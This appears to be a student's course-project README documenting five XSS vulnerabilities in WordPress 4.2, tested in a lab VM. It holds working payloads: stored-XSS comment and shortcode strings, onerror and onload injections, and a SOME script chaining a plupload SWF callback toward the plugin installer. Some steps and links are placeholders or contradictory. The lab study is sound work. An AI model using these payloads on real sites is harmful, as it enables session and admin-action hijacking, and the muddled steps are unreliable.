# Project 7 - WordPress Pentesting

Time spent: **30** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

### 1. (Required) SOME (similar to XSS execution)
  - [ ] Summary: Web Application Attack that abuses the callback endpoints. Can enforce the victim to execute script methods on any page on the endpoints domain.
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 
  - [<img src="http://g.recordit.co/CwYanI8pQY.gif" width=250><br>] GIF Walkthrough: 
  - [ ] Steps to recreate: Leave a comment with a button javascript, after we post it- we get a Button as out comment, so victim clicks on it and weird stuff will pop up.
  - [ ] Affected source code: 
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 2. (Required) Cross Site Scripting Exploit
  - [ ] Summary: Onload we alert with a payload. Alert will pop out everytime the site loads.
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 
  - [<img src="http://g.recordit.co/zU5B75JSqB.gif" width=250><br> ] GIF Walkthrough: 
  - [ ] Steps to recreate: We leave an URL in the post, sort of like HTTP, every time the page loads- it cannot pop out an alert.
  - [ ] Affected source code: 
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 3. (Required) XSS
  - [ ] Summary: We would insert this malicious link into the comment to generate a clickable link <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>. Versions before 4.2.3 starting from at least 3.0 (released in 2010) are vulnerable
    - Vulnerability types: Cross Site 
    - Tested in version: 4.2
    - Fixed in version: 4.2.3 Stored XSS
  - [<img src="http://g.recordit.co/jDhPM4VzCo.gif" width=250><br>] GIF Walkthrough: 
  - [ ] Steps to recreate: Post malicious script in the comment section, after admin has approved your comment- no auth is needed afterwards.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 4. (Optional)  XSS cont. #4 4.2.3 Stored XSS
  - [ ] Summary: 
    - Vulnerability types: Stored XSS. WordPress shortcode processing manipulates this into the following form
     <a href="</a><a title=" onmouseover=alert('test')  ">link</a>
    - Tested in version: 4.2
    - Fixed in version: The bug was corrected on July 23, 2015. It has been patched automatically for most users.
  - [<img src="http://g.recordit.co/Pt3D6BaBmN.gif" width=250><br> ] GIF Walkthrough: 
  - [ ] Steps to recreate: Post malicious script in the comment section, after admin has approved your comment- no auth is needed afterwards.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
### 5. (Optional) XSS
  - [ ] Summary: XSS, example of Cross Site Scripting
    - Vulnerability types:
    - Tested in version: 4.2
    - Fixed in version: 
  - [ <img src="http://g.recordit.co/cHYjzhs3qG.gif" width=250><br>] GIF Walkthrough: 
  - [ ] Steps to recreate: Create a new post using malicious script 
   abc<img src=a onerror=alert('antistore'). Try publishing the post and everytime you would have to click on the pop up in order to comment or do anything else on the site.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

https://klikki.fi/adv/wordpress3.html

Just some examples of the script

<button onclick="fire()">Click</button>
<script>
function fire() {
open('javascript:setTimeout("location=\'http://wpdistillery.vm
/wp-includes/js/plupload
/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');  
  setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
}
</script>

http://wpdistillery.vm/<svg onload=alert(1)>



## Resources

- [WordPress Source Browser](https://klikki.fi/adv/wordpress3.html)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with RecordIt.co.

## Notes

Describe any challenges encountered while doing the work

It's a lot of information to process and 2 week just aren't enough time to explore unless you are an advanced hacker.
## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
